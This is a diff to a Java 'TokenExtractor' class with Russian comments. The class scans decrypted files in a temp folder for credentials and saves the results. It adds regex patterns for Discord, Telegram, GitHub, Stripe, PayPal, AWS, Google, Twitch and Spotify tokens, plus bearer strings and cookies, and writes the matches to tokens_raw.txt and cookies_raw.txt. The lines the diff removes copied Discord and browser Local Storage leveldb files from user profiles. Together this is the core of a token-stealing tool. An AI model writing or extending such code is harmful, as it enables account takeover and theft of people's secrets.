@@ -8,25 +8,39 @@ public class TokenExtractor {
     private static final String DEC_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
     private static final String OUTPUT_DIR = DEC_DIR + "\\extracted";
     
-    // Расширенные паттерны для токенов
+    // Полный список паттернов для токенов
     private static final String[] TOKEN_PATTERNS = {
-        // Discord токены
+        // Discord (основной)
         "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}",
         "mfa\\.[\\w-]{84}",
-        // Токены доступа
-        "[a-f0-9]{32}:[a-f0-9]{35}",
-        // Сессионные токены
+        // Discord OAuth2
+        "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}_[\\w-]{6}",
+        // JWT токены
         "eyJ[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{20,}\\.[a-zA-Z0-9_-]{20,}",
-        // Токены авторизации
-        "[A-Za-z0-9]{40,}",
-        // Токены Telegram
-        "\\d{10}:[A-Za-z0-9_-]{35}",
-        // Токены GitHub
+        // Telegram бот токены
+        "\\d{8,10}:[A-Za-z0-9_-]{35}",
+        // GitHub токены
         "gh[opu]_[A-Za-z0-9]{36}",
-        // Токены Stripe
+        // Stripe
         "sk_live_[A-Za-z0-9]{24}",
-        // API ключи
-        "api[_-]key[=\\s:]+[A-Za-z0-9_-]{20,}"
+        "rk_live_[A-Za-z0-9]{24}",
+        // PayPal
+        "access_token\\$[A-Za-z0-9]{32}\\$[A-Za-z0-9]{32}",
+        // AWS ключи
+        "AKIA[0-9A-Z]{16}",
+        // Google API
+        "AIza[0-9A-Za-z\\-_]{35}",
+        // Twitch токены
+        "oauth:[a-z0-9]{30}",
+        // Spotify
+        "BQ[A-Za-z0-9]{50,}",
+        // Steam
+        "STEAM_[0-9]:[0-9]{1,10}",
+        // Обычные токены доступа
+        "token[=:\\s][A-Za-z0-9_\\-]{20,}",
+        "access_token[=:\\s][A-Za-z0-9_\\-]{20,}",
+        "auth[=:\\s][A-Za-z0-9_\\-]{20,}",
+        "bearer[\\s][A-Za-z0-9_\\-]{20,}"
     };
     
     private static void log(String msg) {
@@ -35,57 +49,13 @@ public class TokenExtractor {
     }
     
     public static void main(String[] args) {
-        log("TokenExtractor v2.0 started");
+        log("TokenExtractor v3.0 started");
         new File(OUTPUT_DIR).mkdirs();
         log("Output dir: " + OUTPUT_DIR);
         
-        // Также ищем в других местах, не только .dec файлах
-        scanAllDirectories();
         extractAll();
         
         log("TokenExtractor finished");
-    }
-    
-    private static void scanAllDirectories() {
-        log("Scanning additional directories for tokens...");
-        
-        // Пути к локальным хранилищам браузеров и Discord
-        String[] extraPaths = {
-            System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
-            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
-            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
-            System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
-            System.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
-            System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
-            System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
-            System.getenv("USERPROFILE") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
-        };
-        
-        for (String path : extraPaths) {
-            if (path != null) {
-                File dir = new File(path);
-                if (dir.exists() && dir.isDirectory()) {
-                    log("Found additional directory: " + path);
-                    copyAndDecryptFiles(dir);
-                }
-            }
-        }
-    }
-    
-    private static void copyAndDecryptFiles(File sourceDir) {
-        File[] files = sourceDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
-        if (files == null) return;
-        
-        for (File f : files) {
-            try {
-                // Копируем файлы во временную папку для обработки
-                String destPath = DEC_DIR + "\\" + f.getName();
-                Files.copy(f.toPath(), Paths.get(destPath), StandardCopyOption.REPLACE_EXISTING);
-                log("Copied: " + f.getName() + " from " + sourceDir.getName());
-            } catch (Exception e) {
-                log("Error copying " + f.getName() + ": " + e.getMessage());
-            }
-        }
     }
     
     private static void extractAll() {
@@ -100,44 +70,46 @@ public class TokenExtractor {
             return;
         }
         
-        // Обрабатываем все файлы, не только .dec
-        File[] allFiles = decFolder.listFiles();
-        if (allFiles == null || allFiles.length == 0) {
+        // Обрабатываем ВСЕ файлы в папке и подпапках
+        java.util.List<File> allFiles = new java.util.ArrayList<>();
+        collectFiles(decFolder, allFiles);
+        
+        if (allFiles.isEmpty()) {
             log("No files found in " + DEC_DIR);
             return;
         }
         
-        log("Processing " + allFiles.length + " file(s)");
+        log("Processing " + allFiles.size() + " file(s)");
         
         for (File f : allFiles) {
-            if (f.isDirectory()) continue;
-            
             try {
                 String content = new String(Files.readAllBytes(f.toPath()));
-                log("Processing: " + f.getName() + " (" + content.length() + " bytes)");
+                if (content.length() < 50) continue;
                 
-                // Поиск токенов по всем паттернам
+                log("Scanning: " + f.getName() + " (" + content.length() + " bytes)");
+                
+                // Поиск токенов
                 for (String patternStr : TOKEN_PATTERNS) {
-                    Pattern p = Pattern.compile(patternStr);
+                    Pattern p = Pattern.compile(patternStr, Pattern.CASE_INSENSITIVE);
                     Matcher m = p.matcher(content);
                     while (m.find()) {
                         String token = m.group();
-                        // Фильтруем слишком короткие или мусорные строки
-                        if (token.length() > 20 && !token.contains(" ") && !token.contains("\n")) {
+                        // Фильтр мусора
+                        if (isValidToken(token)) {
                             allTokens.append("[").append(f.getName()).append("] ").append(token).append("\n");
                             totalTokenCount++;
-                            log("Found token in " + f.getName() + ": " + token.substring(0, Math.min(30, token.length())) + "...");
+                            log("TOKEN FOUND: " + token.substring(0, Math.min(40, token.length())) + "...");
                         }
                     }
                 }
                 
-                // Поиск куки (улучшенный)
-                Pattern cookieP = Pattern.compile("([_a-zA-Z0-9]+)=([^;\\n\\s]+)");
+                // Поиск куки (расширенный)
+                Pattern cookieP = Pattern.compile("([_a-zA-Z0-9]{3,64})=([a-zA-Z0-9_\\-]{10,256})");
                 Matcher cookieM = cookieP.matcher(content);
                 while (cookieM.find()) {
                     String key = cookieM.group(1);
                     String value = cookieM.group(2);
-                    if (value.length() > 10 && !value.contains("null") && !value.contains("undefined")) {
+                    if (isValidCookie(key, value)) {
                         allCookies.append("[").append(f.getName()).append("] ").append(key).append("=").append(value).append("\n");
                         totalCookieCount++;
                     }
@@ -148,25 +120,60 @@ public class TokenExtractor {
             }
         }
         
-        log("Extraction complete: " + totalTokenCount + " tokens, " + totalCookieCount + " cookies");
+        log("=== RESULTS ===");
+        log("Tokens found: " + totalTokenCount);
+        log("Cookies found: " + totalCookieCount);
         
         try {
-            if (allTokens.length() > 0) {
+            if (totalTokenCount > 0) {
                 Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), allTokens.toString().getBytes());
-                log("Tokens saved to: " + OUTPUT_DIR + "\\tokens_raw.txt (" + allTokens.length() + " bytes)");
+                log("Tokens saved to: " + OUTPUT_DIR + "\\tokens_raw.txt");
             } else {
-                log("No tokens found");
-                Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), "No tokens found".getBytes());
+                log("No tokens found - generating debug file");
+                Files.write(Paths.get(OUTPUT_DIR + "\\tokens_debug.txt"), "No tokens found. Here are first 1000 chars from first file:\n".getBytes());
+                if (!allFiles.isEmpty()) {
+                    String sample = new String(Files.readAllBytes(allFiles.get(0).toPath()));
+                    Files.write(Paths.get(OUTPUT_DIR + "\\tokens_debug.txt"), sample.substring(0, Math.min(1000, sample.length())).getBytes(), StandardOpenOption.APPEND);
+                }
             }
             
-            if (allCookies.length() > 0) {
+            if (totalCookieCount > 0) {
                 Files.write(Paths.get(OUTPUT_DIR + "\\cookies_raw.txt"), allCookies.toString().getBytes());
-                log("Cookies saved to: " + OUTPUT_DIR + "\\cookies_raw.txt (" + allCookies.length() + " bytes)");
-            } else {
-                log("No cookies found");
+                log("Cookies saved to: " + OUTPUT_DIR + "\\cookies_raw.txt");
             }
         } catch (Exception e) {
-            log("Error saving output: " + e.getMessage());
+            log("Error saving: " + e.getMessage());
         }
+    }
+    
+    private static void collectFiles(File dir, java.util.List<File> list) {
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File f : files) {
+            if (f.isDirectory()) {
+                collectFiles(f, list);
+            } else {
+                list.add(f);
+            }
+        }
+    }
+    
+    private static boolean isValidToken(String token) {
+        if (token == null) return false;
+        if (token.length() < 20) return false;
+        if (token.contains("{")) return false;
+        if (token.contains("<")) return false;
+        if (token.contains("null")) return false;
+        if (token.contains("undefined")) return false;
+        return true;
+    }
+    
+    private static boolean isValidCookie(String key, String value) {
+        if (key == null || value == null) return false;
+        if (value.length() < 10) return false;
+        if (value.contains("null")) return false;
+        if (value.contains("undefined")) return false;
+        if (key.equals("_ga") && value.length() < 20) return false;
+        return true;
     }
 }
